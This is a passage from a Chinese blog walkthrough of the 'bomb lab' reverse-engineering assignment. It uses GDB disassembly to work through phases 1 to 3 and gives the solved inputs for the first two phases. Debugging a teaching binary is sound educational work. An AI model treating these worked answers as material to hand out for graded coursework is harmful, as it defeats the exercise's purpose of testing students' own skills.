<p>指的应该就是隐藏关卡</p>
<p><img src="/img/jj/bomblab/3.png" alt="img"></p>
<p>最后了解完结构就可以开始拆弹了~</p>
<h3 id="·-启动GDB"><a href="#·-启动GDB" class="headerlink" title="· 启动GDB"></a><code>· 启动GDB</code></h3><p>打开终端，<code>cd</code>至<code>bomb</code>目录下，并输入下面命令启动GDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/4.png" alt="img"></p>
<h3 id="·-phase-1"><a href="#·-phase-1" class="headerlink" title="· phase_1"></a><code>· phase_1</code></h3><p>先进行反汇编</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble phase_1</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/5.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_1</span><br><span class="line">   0x00000000000015b4 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x00000000000015b8 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x00000000000015b9 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x00000000000015bc &lt;+8&gt;:	lea    rsi,[rip+0x1b8d]        # 0x3150</span><br><span class="line">   0x00000000000015c3 &lt;+15&gt;:	call   0x1b86 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000000015c8 &lt;+20&gt;:	test   eax,eax</span><br><span class="line">   0x00000000000015ca &lt;+22&gt;:	jne    0x15ce &lt;phase_1+26&gt;</span><br><span class="line">   0x00000000000015cc &lt;+24&gt;:	pop    rbp</span><br><span class="line">   0x00000000000015cd &lt;+25&gt;:	ret    </span><br><span class="line">   0x00000000000015ce &lt;+26&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000000015d3 &lt;+31&gt;:	jmp    0x15cc &lt;phase_1+24&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>显然里面调用了一个<code>strings_not_equal</code>函数，我们把它也反汇编出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble strings_not_equal</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/6.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function strings_not_equal:</span><br><span class="line">   0x0000000000001b86 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000000000001b8a &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000000000001b8b &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000001b8e &lt;+8&gt;:	push   r13</span><br><span class="line">   0x0000000000001b90 &lt;+10&gt;:	push   r12</span><br><span class="line">   0x0000000000001b92 &lt;+12&gt;:	push   rbx</span><br><span class="line">   0x0000000000001b93 &lt;+13&gt;:	sub    rsp,0x8</span><br><span class="line">   0x0000000000001b97 &lt;+17&gt;:	mov    rbx,rdi</span><br><span class="line">   0x0000000000001b9a &lt;+20&gt;:	mov    r12,rsi</span><br><span class="line">   0x0000000000001b9d &lt;+23&gt;:	call   0x1b65 &lt;string_length&gt;</span><br><span class="line">   0x0000000000001ba2 &lt;+28&gt;:	mov    r13d,eax</span><br><span class="line">   0x0000000000001ba5 &lt;+31&gt;:	mov    rdi,r12</span><br><span class="line">   0x0000000000001ba8 &lt;+34&gt;:	call   0x1b65 &lt;string_length&gt;</span><br><span class="line">   0x0000000000001bad &lt;+39&gt;:	mov    edx,eax</span><br><span class="line">   0x0000000000001baf &lt;+41&gt;:	mov    eax,0x1</span><br><span class="line">   0x0000000000001bb4 &lt;+46&gt;:	cmp    r13d,edx</span><br><span class="line">   0x0000000000001bb7 &lt;+49&gt;:	jne    0x1bea &lt;strings_not_equal+100&gt;</span><br><span class="line">   0x0000000000001bb9 &lt;+51&gt;:	movzx  edx,BYTE PTR [rbx]</span><br><span class="line">   0x0000000000001bbc &lt;+54&gt;:	test   dl,dl</span><br><span class="line">   0x0000000000001bbe &lt;+56&gt;:	je     0x1bde &lt;strings_not_equal+88&gt;</span><br><span class="line">   0x0000000000001bc0 &lt;+58&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000001bc5 &lt;+63&gt;:	cmp    BYTE PTR [r12+rax*1],dl</span><br><span class="line">   0x0000000000001bc9 &lt;+67&gt;:	jne    0x1be5 &lt;strings_not_equal+95&gt;</span><br><span class="line">   0x0000000000001bcb &lt;+69&gt;:	add    rax,0x1</span><br><span class="line">   0x0000000000001bcf &lt;+73&gt;:	movzx  edx,BYTE PTR [rbx+rax*1]</span><br><span class="line">   0x0000000000001bd3 &lt;+77&gt;:	test   dl,dl</span><br><span class="line">   0x0000000000001bd5 &lt;+79&gt;:	jne    0x1bc5 &lt;strings_not_equal+63&gt;</span><br><span class="line">   0x0000000000001bd7 &lt;+81&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000001bdc &lt;+86&gt;:	jmp    0x1bea &lt;strings_not_equal+100&gt;</span><br><span class="line">   0x0000000000001bde &lt;+88&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000001be3 &lt;+93&gt;:	jmp    0x1bea &lt;strings_not_equal+100&gt;</span><br><span class="line">   0x0000000000001be5 &lt;+95&gt;:	mov    eax,0x1</span><br><span class="line">   0x0000000000001bea &lt;+100&gt;:	add    rsp,0x8</span><br><span class="line">   0x0000000000001bee &lt;+104&gt;:	pop    rbx</span><br><span class="line">   0x0000000000001bef &lt;+105&gt;:	pop    r12</span><br><span class="line">   0x0000000000001bf1 &lt;+107&gt;:	pop    r13</span><br><span class="line">   0x0000000000001bf3 &lt;+109&gt;:	pop    rbp</span><br><span class="line">   0x0000000000001bf4 &lt;+110&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>同理，<code>string_length</code>函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble string_length</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function string_length:</span><br><span class="line">   0x0000000000001b65 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000000000001b69 &lt;+4&gt;:	cmp    BYTE PTR [rdi],0x0</span><br><span class="line">   0x0000000000001b6c &lt;+7&gt;:	je     0x1b80 &lt;string_length+27&gt;</span><br><span class="line">   0x0000000000001b6e &lt;+9&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000001b73 &lt;+14&gt;:	add    rdi,0x1</span><br><span class="line">   0x0000000000001b77 &lt;+18&gt;:	add    eax,0x1</span><br><span class="line">   0x0000000000001b7a &lt;+21&gt;:	cmp    BYTE PTR [rdi],0x0</span><br><span class="line">   0x0000000000001b7d &lt;+24&gt;:	jne    0x1b73 &lt;string_length+14&gt;</span><br><span class="line">   0x0000000000001b7f &lt;+26&gt;:	ret    </span><br><span class="line">   0x0000000000001b80 &lt;+27&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000001b85 &lt;+32&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>至此，光是通过函数名推理我们也能得知需要输入一个字符串</p>
<p>分析一下发现，输入的字符串由<code>strings_not_equal</code>函数进入<code>string_length</code>函数，先判断字符串长度是否相等，相等则<code>eax</code>存0返回，不相等则<code>eax</code>存1返回</p>
<p>同时观察到<code>phase_1</code>中描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000000015c8 &lt;+20&gt;:	test   eax,eax</span><br><span class="line">0x00000000000015ca &lt;+22&gt;:	jne    0x15ce &lt;phase_1+26&gt;</span><br><span class="line">0x00000000000015cc &lt;+24&gt;:	pop    rbp</span><br><span class="line">0x00000000000015cd &lt;+25&gt;:	ret    </span><br><span class="line">0x00000000000015ce &lt;+26&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>当<code>eax</code>!= 0 时跳转到引爆函数，显然只有<code>eax</code>== 0 且字符串相等时才能成功拆除</p>
<p>所以应该找到这个要比较的字符串，我们注意到<code>phase_1</code>中有个地址<code>0x3150</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000000015bc &lt;+8&gt;:	lea    rsi,[rip+0x1b8d]        # 0x3150</span><br></pre></td></tr></table></figure>
<p>查看这个内存地址中的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x3150</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/7.png" alt="img"></p>
<p>显然这个字符串就是第一关的答案</p>
<blockquote>
<p><code>When a problem comes along, you must zip it!</code></p>
</blockquote>
<h3 id="·-phase-2"><a href="#·-phase-2" class="headerlink" title="· phase_2"></a><code>· phase_2</code></h3><p>先为<code>phase_2</code>设置断点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) b phase_2</span><br></pre></td></tr></table></figure>
<p>将第一关的答案先存在<code>ans.txt</code>中，用<code>r</code>命令运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) r ans.txt</span><br></pre></td></tr></table></figure>
<p>随便输入一个字符串后反汇编<code>phase_2</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble phase_2</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">=&gt; 0x00005555555555d5 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x00005555555555d9 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x00005555555555da &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x00005555555555dd &lt;+8&gt;:	push   r12</span><br><span class="line">   0x00005555555555df &lt;+10&gt;:	push   rbx</span><br><span class="line">   0x00005555555555e0 &lt;+11&gt;:	sub    rsp,0x20</span><br><span class="line">   0x00005555555555e4 &lt;+15&gt;:	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00005555555555ed &lt;+24&gt;:	mov    QWORD PTR [rbp-0x18],rax</span><br><span class="line">   0x00005555555555f1 &lt;+28&gt;:	xor    eax,eax</span><br><span class="line">   0x00005555555555f3 &lt;+30&gt;:	lea    rsi,[rbp-0x30]</span><br><span class="line">   0x00005555555555f7 &lt;+34&gt;:	call   0x555555555e42 &lt;read_six_numbers&gt;</span><br><span class="line">   0x00005555555555fc &lt;+39&gt;:	cmp    DWORD PTR [rbp-0x30],0x0</span><br><span class="line">   0x0000555555555600 &lt;+43&gt;:	js     0x55555555560d &lt;phase_2+56&gt;</span><br><span class="line">   0x0000555555555602 &lt;+45&gt;:	lea    r12,[rbp-0x30]</span><br><span class="line">   0x0000555555555606 &lt;+49&gt;:	mov    ebx,0x1</span><br><span class="line">   0x000055555555560b &lt;+54&gt;:	jmp    0x555555555625 &lt;phase_2+80&gt;</span><br><span class="line">   0x000055555555560d &lt;+56&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555612 &lt;+61&gt;:	jmp    0x555555555602 &lt;phase_2+45&gt;</span><br><span class="line">   0x0000555555555614 &lt;+63&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555619 &lt;+68&gt;:	add    ebx,0x1</span><br><span class="line">   0x000055555555561c &lt;+71&gt;:	add    r12,0x4</span><br><span class="line">   0x0000555555555620 &lt;+75&gt;:	cmp    ebx,0x6</span><br><span class="line">   0x0000555555555623 &lt;+78&gt;:	je     0x555555555634 &lt;phase_2+95&gt;</span><br><span class="line">   0x0000555555555625 &lt;+80&gt;:	mov    eax,ebx</span><br><span class="line">   0x0000555555555627 &lt;+82&gt;:	add    eax,DWORD PTR [r12]</span><br><span class="line">   0x000055555555562b &lt;+86&gt;:	cmp    DWORD PTR [r12+0x4],eax</span><br><span class="line">   0x0000555555555630 &lt;+91&gt;:	je     0x555555555619 &lt;phase_2+68&gt;</span><br><span class="line">   0x0000555555555632 &lt;+93&gt;:	jmp    0x555555555614 &lt;phase_2+63&gt;</span><br><span class="line">   0x0000555555555634 &lt;+95&gt;:	mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x0000555555555638 &lt;+99&gt;:	xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000555555555641 &lt;+108&gt;:	jne    0x55555555564c &lt;phase_2+119&gt;</span><br><span class="line">   0x0000555555555643 &lt;+110&gt;:	add    rsp,0x20</span><br><span class="line">   0x0000555555555647 &lt;+114&gt;:	pop    rbx</span><br><span class="line">   0x0000555555555648 &lt;+115&gt;:	pop    r12</span><br><span class="line">   0x000055555555564a &lt;+117&gt;:	pop    rbp</span><br><span class="line">   0x000055555555564b &lt;+118&gt;:	ret    </span><br><span class="line">   0x000055555555564c &lt;+119&gt;:	call   0x555555555220 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>同理，反汇编出<code>read_six_numbers</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x0000555555555e42 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000555555555e46 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000555555555e47 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000555555555e4a &lt;+8&gt;:	mov    rdx,rsi</span><br><span class="line">   0x0000555555555e4d &lt;+11&gt;:	lea    rcx,[rsi+0x4]</span><br><span class="line">   0x0000555555555e51 &lt;+15&gt;:	lea    rax,[rsi+0x14]</span><br><span class="line">   0x0000555555555e55 &lt;+19&gt;:	push   rax</span><br><span class="line">   0x0000555555555e56 &lt;+20&gt;:	lea    rax,[rsi+0x10]</span><br><span class="line">   0x0000555555555e5a &lt;+24&gt;:	push   rax</span><br><span class="line">   0x0000555555555e5b &lt;+25&gt;:	lea    r9,[rsi+0xc]</span><br><span class="line">   0x0000555555555e5f &lt;+29&gt;:	lea    r8,[rsi+0x8]</span><br><span class="line">   0x0000555555555e63 &lt;+33&gt;:	lea    rsi,[rip+0x152f]        # 0x555555557399</span><br><span class="line">   0x0000555555555e6a &lt;+40&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000555555555e6f &lt;+45&gt;:	call   0x5555555552c0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000555555555e74 &lt;+50&gt;:	add    rsp,0x10</span><br><span class="line">   0x0000555555555e78 &lt;+54&gt;:	cmp    eax,0x5</span><br><span class="line">   0x0000555555555e7b &lt;+57&gt;:	jle    0x555555555e7f &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000555555555e7d &lt;+59&gt;:	leave  </span><br><span class="line">   0x0000555555555e7e &lt;+60&gt;:	ret    </span><br><span class="line">   0x0000555555555e7f &lt;+61&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>显然要求我们输入6个数字，查看<code>read_six_numbers</code>中的某个内存地址的值，果然应证了我们的猜想</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555e63 &lt;+33&gt;:	lea    rsi,[rip+0x152f]        # 0x555555557399</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x555555557399</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/8.png" alt="img"></p>
<p>阅读分析程序不难发现，输入的第一个数要求不能为负数，且后一个数与前一个数的差依次为<code>1</code>、<code>2</code>、<code>3</code>、<code>4</code>、<code>5</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00005555555555fc &lt;+39&gt;:	cmp    DWORD PTR [rbp-0x30],0x0</span><br><span class="line">0x0000555555555600 &lt;+43&gt;:	js     0x55555555560d &lt;phase_2+56&gt;</span><br><span class="line">0x000055555555560d &lt;+56&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555627 &lt;+82&gt;:	add    eax,DWORD PTR [r12]</span><br><span class="line">0x000055555555562b &lt;+86&gt;:	cmp    DWORD PTR [r12+0x4],eax</span><br><span class="line">0x0000555555555630 &lt;+91&gt;:	je     0x555555555619 &lt;phase_2+68&gt;</span><br></pre></td></tr></table></figure>
<p>显然有很多解，如：</p>
<blockquote>
<ol>
<li><code>0 1 3 6 10 15</code></li>
<li><code>1 2 4 7 11 16</code></li>
<li><code>2 3 5 8 12 17</code></li>
<li>…</li>
</ol>
</blockquote>
<h3 id="·-phase-3"><a href="#·-phase-3" class="headerlink" title="· phase_3"></a><code>· phase_3</code></h3><p>同理，反汇编<code>phase_3</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">=&gt; 0x0000555555555651 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000555555555655 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000555555555656 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000555555555659 &lt;+8&gt;:	sub    rsp,0x20</span><br><span class="line">   0x000055555555565d &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000555555555666 &lt;+21&gt;:	mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x000055555555566a &lt;+25&gt;:	xor    eax,eax</span><br><span class="line">   0x000055555555566c &lt;+27&gt;:	lea    rcx,[rbp-0x11]</span><br><span class="line">   0x0000555555555670 &lt;+31&gt;:	lea    rdx,[rbp-0x10]</span><br><span class="line">   0x0000555555555674 &lt;+35&gt;:	lea    r8,[rbp-0xc]</span><br><span class="line">   0x0000555555555678 &lt;+39&gt;:	lea    rsi,[rip+0x1b27]        # 0x5555555571a6</span><br><span class="line">   0x000055555555567f &lt;+46&gt;:	call   0x5555555552c0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000555555555684 &lt;+51&gt;:	cmp    eax,0x2</span><br><span class="line">   0x0000555555555687 &lt;+54&gt;:	jle    0x5555555556a7 &lt;phase_3+86&gt;</span><br><span class="line">   0x0000555555555689 &lt;+56&gt;:	cmp    DWORD PTR [rbp-0x10],0x7</span><br><span class="line">   0x000055555555568d &lt;+60&gt;:	ja     0x555555555790 &lt;phase_3+319&gt;</span><br><span class="line">   0x0000555555555693 &lt;+66&gt;:	mov    eax,DWORD PTR [rbp-0x10]</span><br><span class="line">   0x0000555555555696 &lt;+69&gt;:	lea    rdx,[rip+0x1b23]        # 0x5555555571c0</span><br><span class="line">   0x000055555555569d &lt;+76&gt;:	movsxd rax,DWORD PTR [rdx+rax*4]</span><br><span class="line">   0x00005555555556a1 &lt;+80&gt;:	add    rax,rdx</span><br><span class="line">   0x00005555555556a4 &lt;+83&gt;:	notrack jmp rax</span><br><span class="line">   0x00005555555556a7 &lt;+86&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x00005555555556ac &lt;+91&gt;:	jmp    0x555555555689 &lt;phase_3+56&gt;</span><br><span class="line">   0x00005555555556ae &lt;+93&gt;:	mov    eax,0x6a</span><br><span class="line">   0x00005555555556b3 &lt;+98&gt;:	cmp    DWORD PTR [rbp-0xc],0x104</span><br><span class="line">   0x00005555555556ba &lt;+105&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x00005555555556c0 &lt;+111&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x00005555555556c5 &lt;+116&gt;:	mov    eax,0x6a</span><br><span class="line">   0x00005555555556ca &lt;+121&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x00005555555556cf &lt;+126&gt;:	mov    eax,0x79</span><br><span class="line">   0x00005555555556d4 &lt;+131&gt;:	cmp    DWORD PTR [rbp-0xc],0x59</span><br><span class="line">   0x00005555555556d8 &lt;+135&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x00005555555556de &lt;+141&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x00005555555556e3 &lt;+146&gt;:	mov    eax,0x79</span><br><span class="line">   0x00005555555556e8 &lt;+151&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x00005555555556ed &lt;+156&gt;:	mov    eax,0x7a</span><br><span class="line">   0x00005555555556f2 &lt;+161&gt;:	cmp    DWORD PTR [rbp-0xc],0x9a</span><br><span class="line">   0x00005555555556f9 &lt;+168&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x00005555555556ff &lt;+174&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555704 &lt;+179&gt;:	mov    eax,0x7a</span><br><span class="line">   0x0000555555555709 &lt;+184&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x000055555555570e &lt;+189&gt;:	mov    eax,0x69</span><br><span class="line">   0x0000555555555713 &lt;+194&gt;:	cmp    DWORD PTR [rbp-0xc],0x230</span><br><span class="line">   0x000055555555571a &lt;+201&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x000055555555571c &lt;+203&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555721 &lt;+208&gt;:	mov    eax,0x69</span><br><span class="line">   0x0000555555555726 &lt;+213&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x0000555555555728 &lt;+215&gt;:	mov    eax,0x72</span><br><span class="line">   0x000055555555572d &lt;+220&gt;:	cmp    DWORD PTR [rbp-0xc],0x398</span><br><span class="line">   0x0000555555555734 &lt;+227&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x0000555555555736 &lt;+229&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x000055555555573b &lt;+234&gt;:	mov    eax,0x72</span><br><span class="line">   0x0000555555555740 &lt;+239&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x0000555555555742 &lt;+241&gt;:	mov    eax,0x71</span><br><span class="line">   0x0000555555555747 &lt;+246&gt;:	cmp    DWORD PTR [rbp-0xc],0xe2</span><br><span class="line">   0x000055555555574e &lt;+253&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x0000555555555750 &lt;+255&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555755 &lt;+260&gt;:	mov    eax,0x71</span><br><span class="line">   0x000055555555575a &lt;+265&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x000055555555575c &lt;+267&gt;:	mov    eax,0x6f</span><br><span class="line">   0x0000555555555761 &lt;+272&gt;:	cmp    DWORD PTR [rbp-0xc],0x207</span><br><span class="line">   0x0000555555555768 &lt;+279&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x000055555555576a &lt;+281&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x000055555555576f &lt;+286&gt;:	mov    eax,0x6f</span><br><span class="line">   0x0000555555555774 &lt;+291&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x0000555555555776 &lt;+293&gt;:	mov    eax,0x77</span><br><span class="line">   0x000055555555577b &lt;+298&gt;:	cmp    DWORD PTR [rbp-0xc],0xe1</span><br><span class="line">   0x0000555555555782 &lt;+305&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x0000555555555784 &lt;+307&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555789 &lt;+312&gt;:	mov    eax,0x77</span><br><span class="line">   0x000055555555578e &lt;+317&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">   0x0000555555555790 &lt;+319&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000555555555795 &lt;+324&gt;:	mov    eax,0x6c</span><br><span class="line">   0x000055555555579a &lt;+329&gt;:	cmp    BYTE PTR [rbp-0x11],al</span><br><span class="line">   0x000055555555579d &lt;+332&gt;:	jne    0x5555555557b0 &lt;phase_3+351&gt;</span><br><span class="line">   0x000055555555579f &lt;+334&gt;:	mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x00005555555557a3 &lt;+338&gt;:	xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00005555555557ac &lt;+347&gt;:	jne    0x5555555557b7 &lt;phase_3+358&gt;</span><br><span class="line">   0x00005555555557ae &lt;+349&gt;:	leave  </span><br><span class="line">   0x00005555555557af &lt;+350&gt;:	ret    </span><br><span class="line">   0x00005555555557b0 &lt;+351&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x00005555555557b5 &lt;+356&gt;:	jmp    0x55555555579f &lt;phase_3+334&gt;</span><br><span class="line">   0x00005555555557b7 &lt;+358&gt;:	call   0x555555555220 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>查看内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555678 &lt;+39&gt;:	lea    rsi,[rip+0x1b27]        # 0x5555555571a6</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x5555555571a6</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/9.png" alt="img"></p>
<p>显然需要输入两个整数和一个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000055555555566c &lt;+27&gt;:	lea    rcx,[rbp-0x11]</span><br><span class="line">0x0000555555555670 &lt;+31&gt;:	lea    rdx,[rbp-0x10]</span><br><span class="line">0x0000555555555674 &lt;+35&gt;:	lea    r8,[rbp-0xc]</span><br></pre></td></tr></table></figure>
<p>阅读程序知<code>%d</code> <code>%c</code> <code>%d</code>分别存到了<code>[rbp-0x10]</code> <code>[rbp-0x11]</code> <code>[rbp-0xc]</code></p>
<p>所以我们只需要从程序中找到这三个应该满足的条件</p>
<ul>
<li><p><strong><code>[rbp-0x10]</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555689 &lt;+56&gt;:	cmp    DWORD PTR [rbp-0x10],0x7</span><br><span class="line">0x000055555555568d &lt;+60&gt;:	ja     0x555555555790 &lt;phase_3+319&gt;</span><br><span class="line">0x0000555555555790 &lt;+319&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>第一个数字需满足小于等于<code>7</code></p>
</li>
<li><p><strong><code>[rbp-0x11]</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000055555555579a &lt;+329&gt;:	cmp    BYTE PTR [rbp-0x11],al</span><br><span class="line">0x000055555555579d &lt;+332&gt;:	jne    0x5555555557b0 &lt;phase_3+351&gt;</span><br><span class="line">0x00005555555557b0 &lt;+351&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>字符的ASCII码需等于前面出现的<code>eax</code></p>
</li>
<li><p><strong><code>[rbp-0xc]</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00005555555556ae &lt;+93&gt;:	mov    eax,0x6a</span><br><span class="line">0x00005555555556b3 &lt;+98&gt;:	cmp    DWORD PTR [rbp-0xc],0x104</span><br><span class="line">0x00005555555556ba &lt;+105&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x00005555555556c0 &lt;+111&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x00005555555556c5 &lt;+116&gt;:	mov    eax,0x6a</span><br><span class="line">0x00005555555556ca &lt;+121&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x00005555555556cf &lt;+126&gt;:	mov    eax,0x79</span><br><span class="line">0x00005555555556d4 &lt;+131&gt;:	cmp    DWORD PTR [rbp-0xc],0x59</span><br><span class="line">0x00005555555556d8 &lt;+135&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x00005555555556de &lt;+141&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x00005555555556e3 &lt;+146&gt;:	mov    eax,0x79</span><br><span class="line">0x00005555555556e8 &lt;+151&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x00005555555556ed &lt;+156&gt;:	mov    eax,0x7a</span><br><span class="line">0x00005555555556f2 &lt;+161&gt;:	cmp    DWORD PTR [rbp-0xc],0x9a</span><br><span class="line">0x00005555555556f9 &lt;+168&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x00005555555556ff &lt;+174&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x0000555555555704 &lt;+179&gt;:	mov    eax,0x7a</span><br><span class="line">0x0000555555555709 &lt;+184&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x000055555555570e &lt;+189&gt;:	mov    eax,0x69</span><br><span class="line">0x0000555555555713 &lt;+194&gt;:	cmp    DWORD PTR 